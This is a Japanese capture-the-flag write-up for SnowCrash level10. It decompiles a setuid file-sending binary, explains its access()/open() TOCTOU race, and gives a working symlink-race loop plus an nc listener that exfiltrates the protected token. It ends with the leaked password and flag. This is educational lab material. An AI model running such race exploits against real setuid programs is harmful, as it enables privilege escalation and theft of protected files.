## ~に存在するファイルを確認
```sh
ls -l
total 16
-rwsr-sr-x+ 1 flag10 level10 10817 Mar  5  2016 level10
-rw-------  1 flag10 flag10     26 Mar  5  2016 token
```

## ghidraでdisassする

```c
void main(int ac, char **argv)

{
  char *__cp;
  uint16_t uVar1;
  int iVar2;
  int iVar3;
  ssize_t sVar4;
  size_t __n;
  int *piVar5;
  char *file_name;
  int in_GS_OFFSET;
  undefined local_1024 [4096];
  sockaddr local_24;

  if (ac < 3) {
    printf("%s file host\n\tsends file to host if you have access to it\n",*argv);
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  file_name = (char *)argv[1];
  __cp = (char *)argv[2];

  iVar2 = access((char *)argv[1],R_OK);
  if (iVar2 == 0) {
    printf("Connecting to %s:6969 .. ",__cp);
    fflush(stdout);
    iVar2 = socket(2,1,0);
    local_24.sa_data[2] = '\0';
    local_24.sa_data[3] = '\0';
    local_24.sa_data[4] = '\0';
    local_24.sa_data[5] = '\0';
    local_24.sa_data[6] = '\0';
    local_24.sa_data[7] = '\0';
    local_24.sa_data[8] = '\0';
    local_24.sa_data[9] = '\0';
    local_24.sa_data[10] = '\0';
    local_24.sa_data[0xb] = '\0';
    local_24.sa_data[0xc] = '\0';
    local_24.sa_data[0xd] = '\0';
    local_24.sa_family = 2;
    local_24.sa_data[0] = '\0';
    local_24.sa_data[1] = '\0';
    local_24.sa_data._2_4_ = inet_addr(__cp);
    uVar1 = htons(0x1b39);
    local_24.sa_data._0_2_ = uVar1;
    iVar3 = connect(iVar2,&local_24, 0x10);
    if (iVar3 == -1) {
      printf("Unable to connect to host %s\n",__cp);
                    /* WARNING: Subroutine does not return */
      exit(1);
    }
    sVar4 = write(iVar2,".*( )*.\n",8);
    if (sVar4 == -1) {
      printf("Unable to write banner to host %s\n",__cp);
                    /* WARNING: Subroutine does not return */
      exit(1);
    }
    printf("Connected!\nSending file .. ");
    fflush(stdout);
    iVar3 = open(file_name,O_RDONLY);
    if (iVar3 == -1) {
      puts("Damn. Unable to open file");
                    /* WARNING: Subroutine does not return */
      exit(1);
    }
    __n = read(iVar3,local_1024,0x1000);
    if (__n == 0xffffffff) {
      piVar5 = __errno_location();
      file_name = strerror(*piVar5);
      printf("Unable to read from file: %s\n",file_name);
                    /* WARNING: Subroutine does not return */
      exit(1);
    }
    write(iVar2,local_1024,__n);
    puts("wrote file!");
  }
  else {
    printf("You don\'t have access to %s\n",file_name);
  }

  return;
}
```
## 関数のポイント
`access((char *)argv[1],R_OK);` は実ユーザーでファイル読み取り権限を確認するため、`level10`ユーザーが`token`を引数に渡すとでエラーになる。
一方、`open(file_name,O_RDONLY);` は実効ユーザーである`flag10` の権限でファイルアクセス権限を確認する。
したがって、`access((char *)argv[1],R_OK);`をうまく突破すれば`token`の中身を確認できる。

`TOCTOU`というのがある。チェックと使用タイミングのズレがあると問題になる。つまり、`open` と`access` の間に脆弱性がある。
https://en.wikipedia.org/wiki/Time-of-check_to_time-of-use
## エクスプロイト

### シンボリックリンクを操作するスクリプト
１つ目のスクリプトは、実ユーザー権限がある`/tmp/sym_token`を読み込ませて、`access`関数を突破する。
その後、`read`関数の前までに`/tmp/sym_token` と`token`をシンボリックリンクし、`token`を`write`する。

```sh
echo '#!/bin/bash' > /tmp/script
echo 'while true; do' >> /tmp/script
echo '> /tmp/sym_token' >> /tmp/script
echo './level10 /tmp/sym_token  127.0.0.1 &' >> /tmp/script
echo 'ln -sf /home/user/level10/token /tmp/sym_token' >> /tmp/script
echo 'rm -f /tmp/sym_token' >> /tmp/script
echo 'done' >> /tmp/script

chmod +x /tmp/script
```

### 受信した文字列をファイルに保存するスクリプト
```sh
echo '#!/bin/bash' > /tmp/script1
echo '> /tmp/pw' >> /tmp/script1
echo 'while true; do' >> /tmp/script1
echo 'nc -l 6969 >> /tmp/pw' >> /tmp/script1
echo 'done' >> /tmp/script1

chmod +x /tmp/script1
```
### 実行
タイミングを完璧に制御できないため、試行回数でカバーする必要がある。
```sh
/tmp/script > /dev/null 2>&1 &
/tmp/script1 > /dev/null 2>&1 &

# 少し経ったらプロセスを終了する
pkill -f /tmp/script
pkill -f /tmp/script1
```

### 確認する
```sh
grep -v '\.\*\( \)*' /tmp/pw
woupa2yuojeeaaed06riuj63c
woupa2yuojeeaaed06riuj63c
woupa2yuojeeaaed06riuj63c
woupa2yuojeeaaed06riuj63c
woupa2yuojeeaaed06riuj63c
```

```sh
level10@SnowCrash:~$ su flag10
Password:
Don't forget to launch getflag !
flag10@SnowCrash:~$ getflag
Check flag.Here is your token : feulo4b72j7edeahuete3no7c
```
